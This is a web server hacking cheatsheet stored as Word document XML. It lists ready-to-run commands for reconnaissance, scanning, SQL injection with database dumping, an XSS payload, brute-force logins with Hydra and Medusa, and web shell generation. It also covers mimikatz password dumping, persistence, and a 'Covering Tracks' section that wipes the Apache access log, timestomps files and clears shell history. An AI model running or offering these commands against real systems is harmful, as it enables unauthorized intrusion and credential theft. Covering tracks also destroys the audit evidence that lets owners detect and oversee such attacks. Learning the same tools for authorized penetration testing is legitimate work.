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Web Server Hacking - Practical Cheatsheet</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>This cheatsheet provides a detailed step-by-step methodology for hacking web servers, including tools, commands, and practical usage examples. It covers reconnaissance, scanning, enumeration, exploitation, and post-exploitation with beginner to advanced tools.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Reconnaissance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Nmap: nmap -sV -p- &lt;target&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>WhatWeb: whatweb &lt;target&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Wappalyzer (Browser Extension): Identify frameworks, CMS, servers, etc.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>theHarvester: theHarvester -d &lt;domain&gt; -b all</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>subfinder: subfinder -d &lt;domain&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Vulnerability Scanning</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Nikto: nikto -h &lt;target&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Nmap NSE: nmap --script vuln &lt;target&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>OpenVAS: Run web vulnerability scan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Burp Suite Active Scan: Right-click → Do Active Scan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ffuf (Fuzzing): ffuf -u http://&lt;target&gt;/FUZZ -w /path/to/wordlist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Directory &amp; File Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Gobuster: gobuster dir -u http://&lt;target&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>dirb: dirb http://&lt;target&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>feroxbuster: feroxbuster -u http://&lt;target&gt; -w /path/to/wordlist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Burp Suite (Manual Exploitation): Intercept, modify, and replay requests</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SQLMap (SQL Injection): sqlmap -u "http://&lt;target&gt;/page.php?id=1" --batch --dump</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>XSS Exploitation: &lt;script&gt;alert('XSS')&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Command Injection (manual): http://&lt;target&gt;/page.php?cmd=ls</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Metasploit: use exploit/multi/http/struts_dmi_exec</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Authentication Attacks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Hydra: hydra -l admin -P /usr/share/wordlists/rockyou.txt &lt;target&gt; http-post-form "/login:username=^USER^&amp;password=^PASS^:F=incorrect"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Burp Suite Intruder: Set payloads to brute-force login</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Medusa: medusa -h &lt;target&gt; -u admin -P rockyou.txt -M http</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. File Upload &amp; Web Shells</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Manual Upload: Upload PHP/JSP/ASP shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Weevely: weevely generate password shell.php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Metasploit Web Delivery: use exploit/multi/script/web_delivery</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>7. Post Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Meterpreter: sessions -i &lt;id&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Privilege Escalation: linpeas.sh (Linux), winPEAS.exe (Windows)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Password Dumping: mimikatz sekurlsa::logonpasswords</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Persistence: Create admin user, cronjob, or scheduled task</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>8. Covering Tracks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Log Clearing (Linux): echo &gt; /var/log/apache2/access.log</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Metasploit Timestomp: timestomp &lt;file&gt; -z</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Clear Bash History: history -c &amp;&amp; unset HISTFILE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